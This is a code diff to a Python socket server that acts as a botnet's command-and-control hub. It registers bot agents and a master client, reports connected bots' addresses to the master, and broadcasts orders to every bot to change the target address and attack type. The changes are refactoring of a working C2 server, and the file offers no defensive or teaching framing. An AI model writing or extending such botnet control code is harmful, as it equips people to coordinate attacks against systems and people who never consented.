@@ -1,8 +1,8 @@
 import socket
 import sys
-from typing import Any
 import select
 import argparse
+import time
 
 RECV_BUFFER = 4096
 ENCODING = 'utf-8'
@@ -15,7 +15,7 @@ class Server():
         self.port = port
         self.sock: socket.socket = None
         self.socket_list: list[socket.socket] = []
-        self.bot_agents: dict[socket.socket, Any] = {}
+        self.bot_agents: dict[socket.socket, str] = {}
         self.master_client: socket.socket = None
         self.target_address: str = ''
         self.attk_type: int = 0
@@ -23,7 +23,6 @@ class Server():
 
     def start(self) -> None:
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         self.sock.bind((self.host, self.port))
         self.sock.listen()
         self.socket_list.append(self.sock)
@@ -54,12 +53,14 @@ class Server():
         finally:
             self.sock.close()
             sys.exit()
+        return
 
     def _accept_wrapper(self, notified_sock: socket.socket) -> None:
         self.socket_list.append(notified_sock)
         print(f'New client connected > {str(notified_sock.getpeername())}')
         # Ask client for identification
         notified_sock.send('whoami:_'.encode(ENCODING))
+        return
 
     def _request_router(self, sock: socket.socket) -> None:
         sock_addr = sock.getpeername()
@@ -93,35 +94,44 @@ class Server():
         except Exception as e:
             print(e)
             self._disconnect_wrapper(sock)
+        
+        return
 
     def _iam_handler(self, sock: socket.socket, body: str) -> None:
         if body == 'master':
             self.master_client = sock
             response = 'iam:success:master identified'
         elif body == 'bot':
-            self.bot_agents[sock] = sock.getsockname()
+            # Generate socket infor
+            sock_addr = sock.getpeername()
+            curr_time = str(int(time.time()))
+            bot_info = '' + curr_time + ';' + \
+                sock_addr[0] + ';' + str(sock_addr[1])
+            self.bot_agents[sock] = bot_info
+
             response = 'iam:success:bot identified'
+
+            # update client bot list
+            if self.master_client:
+                bots = self._get_bot_list()
+                self.master_client.sendall(f'listbot:{bots}'.encode(ENCODING))
         else:
             response = 'iam:error:unknown type'
 
         sock.send(response.encode(ENCODING))
+        return
 
     def _master_handler(self, sock: socket.socket, type: str, body: str) -> None:
         if type == 'listbot':
-            if len(self.bot_agents) == 0:
-                response = 'listbot: '
-            else:
-                list_bot = ''
-                for bot in self.bot_agents:
-                    list_bot += repr(self.bot_agents[bot]) + ','
-                response = ('listbot:' + list_bot)
+            bots = self._get_bot_list()
+            response = f'listbot:{bots}'
         elif type == 'changeip':
-            # TODO: check if valid ip/address
+            # TODO check if valid ip/address
             self._bot_broadcast(f'changeip:{body}'.encode(ENCODING))
             self.target_address = body
             return
         elif type == 'changattk':
-            # TODO: check if valid attack
+            # TODO check if valid attack
             self._bot_broadcast(f'changeattk:{body}'.encode(ENCODING))
             self.attk_type = body
             return
@@ -146,34 +156,47 @@ class Server():
         else:
             response = f'{type}:error:unknown command'
 
-        sock.send(response.encode(ENCODING))
+        sock.sendall(response.encode(ENCODING))
+        return
 
     def _bot_handler(self, sock: socket.socket, type: str, body: str) -> None:
-        pass
+        return
 
     def _bot_broadcast(self, message: bytes) -> None:
         for sock in self.bot_agents:
             sock.send(message)
+        return
 
     def _disconnect_wrapper(self, sock: socket.socket) -> None:
         self.socket_list.remove(sock)
-        sock_addr = repr(sock.getpeername())
+        sock_addr = sock.getpeername()
+        sock_addr_str = '' + sock_addr[0] + str(sock_addr[1])
 
         # bot agent disconnect
         if sock in self.bot_agents:
             del self.bot_agents[sock]
 
             if self.master_client:
-                self.master_client.send(
-                    f'botleft:{sock_addr}'.encode(ENCODING))
+                bots = self._get_bot_list()
+                self.master_client.sendall(
+                    f'listbot:{bots}'.encode(ENCODING))
 
-            print(f'bot agent {sock_addr} disconnected')
+            print(f'bot agent {sock_addr_str} disconnected')
         # master client disconnect
         elif self.master_client == sock:
             self.master_client = None
-            print(f'master client {sock_addr} disconnected')
+            print(f'master client {sock_addr_str} disconnected')
         else:
-            print(f'client {sock_addr} disconnected')
+            print(f'client {sock_addr_str} disconnected')
+
+        return
+
+    def _get_bot_list(self) -> str:
+        bots = ''
+        for bot in self.bot_agents:
+            bots += self.bot_agents[bot] + ','
+
+        return bots
 
 
 if __name__ == "__main__":
